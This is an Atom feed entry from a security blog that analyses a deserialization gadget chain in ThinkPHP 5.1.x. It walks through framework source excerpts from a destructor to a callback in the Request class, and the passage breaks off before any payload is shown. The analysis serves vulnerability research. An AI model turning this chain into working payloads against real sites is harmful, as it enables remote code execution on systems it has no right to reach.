<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>J0k3r</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://j0k3r.top/"/>
  <updated>2019-10-12T07:53:55.712Z</updated>
  <id>http://j0k3r.top/</id>
  
  <author>
    <name>J0k3r</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ThinkPHP v5.1.x POP 链分析</title>
    <link href="http://j0k3r.top/2019/10/12/ThinkPHP_pop_v5.1.x/"/>
    <id>http://j0k3r.top/2019/10/12/ThinkPHP_pop_v5.1.x/</id>
    <published>2019-10-11T16:00:00.000Z</published>
    <updated>2019-10-12T07:53:55.712Z</updated>
    
    <content type="html"><![CDATA[<p>文章首发于合天智汇：<a href="https://mp.weixin.qq.com/s/8dyuy-rW8-6isvHxmTI33A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/8dyuy-rW8-6isvHxmTI33A</a></p><a id="more"></a><p>前段时间网上爆出 ThinkPHP 5.1.x 的 POP 链，早就想分析一下，正好最近有空，就记录一下吧</p><p>环境：</p><p>MacOS 10.13 </p><p>MAMAP Pro</p><p>php 7.0.33 + xdebug</p><p>Visual Studio Code</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="我所理解的-POP-Chain："><a href="#我所理解的-POP-Chain：" class="headerlink" title="我所理解的 POP Chain："></a>我所理解的 POP Chain：</h3><p>利用魔术方法并巧妙构造特殊属性调用一系列函数或类方法以执行某种敏感操作的调用堆栈</p><h3 id="反序列化常用魔法函数"><a href="#反序列化常用魔法函数" class="headerlink" title="反序列化常用魔法函数"></a>反序列化常用魔法函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">__wakeup， unserialize() 执行前调用</span><br><span class="line"></span><br><span class="line">__destruct， 对销毁的时候调用</span><br><span class="line"></span><br><span class="line">__toString， 类被当成字符串时的回应方法</span><br><span class="line"></span><br><span class="line">__construct()，当对象创建(new)时会自动调用，注意在</span><br><span class="line"></span><br><span class="line">unserialize()时并不会自动调用</span><br><span class="line"></span><br><span class="line">__sleep()，serialize()时会先被调用</span><br><span class="line"></span><br><span class="line">__call()，在对象中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line">__callStatic()，用静态方式中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line">__get()，获得一个类的成员变量时调用</span><br><span class="line"></span><br><span class="line">__set()，设置一个类的成员变量时调用</span><br><span class="line"></span><br><span class="line">__isset()，当对不可访问属性调用isset()或empty()时调用</span><br><span class="line"></span><br><span class="line">__unset()，当对不可访问属性调用unset()时被调用。</span><br><span class="line"></span><br><span class="line">__wakeup()，执行unserialize()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line">__toString()，类被当成字符串时的回应方法</span><br><span class="line"></span><br><span class="line">__invoke()，调用函数的方式调用一个对象时的回应方法</span><br><span class="line"></span><br><span class="line">__set_state()，调用var_export()导出类时，此静态方法会被调用。</span><br><span class="line"></span><br><span class="line">__clone()，当对象复制完成时调用</span><br><span class="line"></span><br><span class="line">__autoload()，尝试加载未定义的类</span><br><span class="line"></span><br><span class="line">__debugInfo()，打印所需调试信息</span><br></pre></td></tr></table></figure><h3 id="phar-文件通过-phar-伪协议拓宽攻击面"><a href="#phar-文件通过-phar-伪协议拓宽攻击面" class="headerlink" title="phar 文件通过 phar:// 伪协议拓宽攻击面"></a>phar 文件通过 phar:// 伪协议拓宽攻击面</h3><blockquote><p>因为 phar 文件会以序列化的形式存储用户自定义的meta-data，所以在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作,深入了解请至：<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p></blockquote><table><thead><tr><th>受影响文件系统函数</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>fileatime</td><td>filectime</td><td>file_exists</td><td>file_get_contents</td></tr><tr><td>file_put_contents</td><td>file</td><td>filegroup</td><td>fopen</td></tr><tr><td>fileinode</td><td>filemtime</td><td>fileowner</td><td>fileperms</td></tr><tr><td>is_dir</td><td>is_executable</td><td>is_file</td><td>is_link</td></tr><tr><td>is_readable</td><td>is_writable</td><td>is_writeable</td><td>parse_ini_file</td></tr><tr><td>copy</td><td>unlink</td><td>stat</td><td>readfile</td></tr></tbody></table><p>如果对反序列化没有了解的话建议先学习下相关内容</p><h2 id="ThinkPHP-v5-1-x-POP-链分析"><a href="#ThinkPHP-v5-1-x-POP-链分析" class="headerlink" title="ThinkPHP v5.1.x POP 链分析"></a>ThinkPHP v5.1.x POP 链分析</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>这里使用的是官方 ThinkPHP V5.1.38</p><p>composer 部署</p><p><code>composer create-project topthink/think=5.1.38 tp5.1.38</code></p><h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><p>全局搜索函数 <code>__destruct</code> </p><p><img src="https://i.loli.net/2019/10/03/uxMZLERr74UgmIa.png" alt></p><p>来到 /thinkphp/library/think/process/pipes/Windows.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;close();</span><br><span class="line">       <span class="keyword">$this</span>-&gt;removeFiles();</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">. . .  . . . </span><br><span class="line"></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 删除临时文件</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">           <span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">               @unlink($filename);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;files = [];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>看下 <code>file_exists</code> 的描述</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_exists ( string $filename ) : bool</span><br></pre></td></tr></table></figure><p>如果传入的 <code>$filename</code> 是个反序列化的对象，在被 file_exists 当作字符串处理的时候就会触发其 <code>__toString</code> 方法（如果有的话）</p><p>所以下面就是找含 <code>__toString</code> 方法的类</p><p><img src="https://i.loli.net/2019/10/03/qVYakLcwTsSpv1I.png" alt></p><p>来到 /thinkphp/library/think/model/concern/Conversion.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span><span class="params">($options = JSON_UNESCAPED_UNICODE)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), $options);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">. . .   . . . </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;toJson();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，在 <code>toJson()</code> 函数中又调用了 <code>toArray()</code> 函数</p><p>如果 <code>toArray()</code> 函数中存在并使用某个可控变量的方法，那么我们就可以利用这点去触发其他类的 <code>__call</code> 方法</p><p>下面是 <code>toArray()</code> 函数的定义，<code>$this-&gt;append</code> 作为类属性是可控的，所以 <code>$relation</code> 和 <code>$name</code> 也就可控了，于是 <code>$relation-&gt;visible($name);</code> 就成了这个 POP 链中的中间跳板</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $item       = [];</span><br><span class="line">    $hasVisible = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">. . .   . . .</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;append)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> $key =&gt; $name) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($name)) &#123;</span><br><span class="line">                <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                $relation = <span class="keyword">$this</span>-&gt;getRelation($key);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!$relation) &#123;</span><br><span class="line">                    $relation = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">                    <span class="keyword">if</span> ($relation) &#123;</span><br><span class="line">                        $relation-&gt;visible($name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                $item[$key] = $relation ? $relation-&gt;append($name)-&gt;toArray() : [];</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (strpos($name, <span class="string">'.'</span>)) &#123;</span><br><span class="line">         </span><br><span class="line">           . . .   . . .   </span><br><span class="line">      </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $item[$name] = <span class="keyword">$this</span>-&gt;getAttr($name, $item);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $item;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那我们在这里应该传入怎么样的值以及什么数据呢，先看下 <code>$relation</code> 是如何处理得到的</p><p>跟进 getRelation，在 /thinkphp/library/think/model/concern/RelationShip.php 中找到函数定义</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">trait</span> RelationShip</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">. . .   . . . </span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取当前模型的关联模型数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $name 关联方法名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">. . .   . . . </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于 getRelation 最终都会 <code>return;</code> 导致返回 NULL，所以 下面的 <code>if (!$relation)</code> 一定成立</p><p>所以直接跟进后面的 getAttr，在 /thinkphp/library/think/model/concern/Attribute.php 找到其定义</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">trait</span> Attribute</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">. . .   . . .</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$name];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidArgumentException(<span class="string">'property not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">. . .   . . . </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">($name, &amp;$item = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $notFound = <span class="keyword">false</span>;</span><br><span class="line">            $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">            $notFound = <span class="keyword">true</span>;</span><br><span class="line">            $value    = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        . . .  . . . </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从 getAttr —&gt; getData 返回 data 数组中同名键值的元素值，即 <code>$relation &lt;---- $this-&gt;data[$name]</code>，我们需要的 <code>$data</code> 和 <code>$append</code> 分别位于 Attribute 和 Conversion，且两者都是 trait 类型</p><p>Trait 可以说是和 Class 相似，是 PHP 5.4.0 开始实现的一种代码复用的方法，可以使用 use 加载，举个例子</p><p><img src="https://i.loli.net/2019/10/03/M56YmyLlDWxp84B.png" alt></p><p>详情可以看官方手册 <a href="https://www.php.net/manual/zh/language.oop5.traits.php" target="_blank" rel="noopener">PHP: Trait - Manual</a></p><p>所以接下来是寻找一个同时使用了 Attribute 和 Conversion 的类</p><p><img src="https://i.loli.net/2019/10/03/RgBKpY2EaTWoZNm.png" alt></p><p>发现只有 /thinkphp/library/think/Model.php 满足条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> <span class="keyword">implements</span> \<span class="title">JsonSerializable</span>, \<span class="title">ArrayAccess</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">TimeStamp</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"></span><br><span class="line">. . .   . . .</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面就需要找到一个没有 visible 方法却有 __call 方法的类作为执行点</p><p>找到 /thinkphp/library/think/Request.php 中的 Request 类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">. . .   . . . </span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 扩展方法</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $hook = [];</span><br><span class="line">    </span><br><span class="line">    . . .   . . . </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (array_key_exists($method, <span class="keyword">$this</span>-&gt;hook)) &#123;</span><br><span class="line">            array_unshift($args, <span class="keyword">$this</span>);</span><br><span class="line">            <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;hook[$method], $args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'method not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $method);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">. . .   . . .</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的回调参数来源于 <code>$hook</code> 数组，而且方法名和参数都是可控的，不过 <code>array_unshift</code> 函数会把若干元素前置到数组的开头</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$queue = <span class="keyword">array</span>(<span class="string">"orange"</span>, <span class="string">"banana"</span>);</span><br><span class="line">array_unshift($queue, <span class="string">"apple"</span>, <span class="string">"raspberry"</span>);</span><br><span class="line">print_r($queue);</span><br><span class="line"></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; apple</span><br><span class="line">    [<span class="number">1</span>] =&gt; raspberry</span><br><span class="line">    [<span class="number">2</span>] =&gt; orange</span><br><span class="line">    [<span class="number">3</span>] =&gt; banana</span><br><span class="line">)</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">这样的话明显就很难执行命令了，因为参数数组的第一个元素始终是 `<span class="keyword">$this</span>`，无法直接执行我们想要的命令， 需要其他某种对参数不是这么敏感的函数作为一个新的执行点或者跳板</span><br><span class="line"></span><br><span class="line">Request 类中有一个 filterValue 函数具有过滤功能，寻找调用 filterValue 的地方以便控制 `$value` 和 `$filters` 好执行命令</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span><span class="params">(&amp;$value, $key, $filters)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $default = array_pop($filters);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">                <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">                $value = call_user_func($filter, $value);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (is_scalar($value)) &#123;</span><br><span class="line">                </span><br><span class="line">             . . .   . . .         </span><br><span class="line">             </span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Request 类中的 input 函数由 array_walk_recursive 调用了 filterValue，但是参数仍不可控，再往上寻找调用点看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">false</span> === $name) &#123;</span><br><span class="line">          <span class="comment">// 获取原始数据</span></span><br><span class="line">          <span class="keyword">return</span> $data;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      $name = (string) $name;</span><br><span class="line">      <span class="keyword">if</span> (<span class="string">''</span> != $name) &#123;</span><br><span class="line">          <span class="comment">// 解析name</span></span><br><span class="line">          <span class="keyword">if</span> (strpos($name, <span class="string">'/'</span>)) &#123;</span><br><span class="line">              <span class="keyword">list</span>($name, $type) = explode(<span class="string">'/'</span>, $name);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          $data = <span class="keyword">$this</span>-&gt;getData($data, $name);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (is_null($data)) &#123;</span><br><span class="line">              <span class="keyword">return</span> $default;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (is_object($data)) &#123;</span><br><span class="line">              <span class="keyword">return</span> $data;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 解析过滤器</span></span><br><span class="line">      $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">          array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">          <span class="keyword">if</span> (version_compare(PHP_VERSION, <span class="string">'7.1.0'</span>, <span class="string">'&lt;'</span>)) &#123;</span><br><span class="line">              <span class="comment">// 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span></span><br><span class="line">              <span class="keyword">$this</span>-&gt;arrayReset($data);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">. . .   . . . </span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> $data;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>Request 类中的 param 函数调用了 input 函数，但同样参数不可控，再往上寻找调用点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">. . .   . . .</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">true</span> === $name) &#123;</span><br><span class="line">          <span class="comment">// 获取包含文件上传信息的数组</span></span><br><span class="line">          $file = <span class="keyword">$this</span>-&gt;file();</span><br><span class="line">          $data = is_array($file) ? array_merge(<span class="keyword">$this</span>-&gt;param, $file) : <span 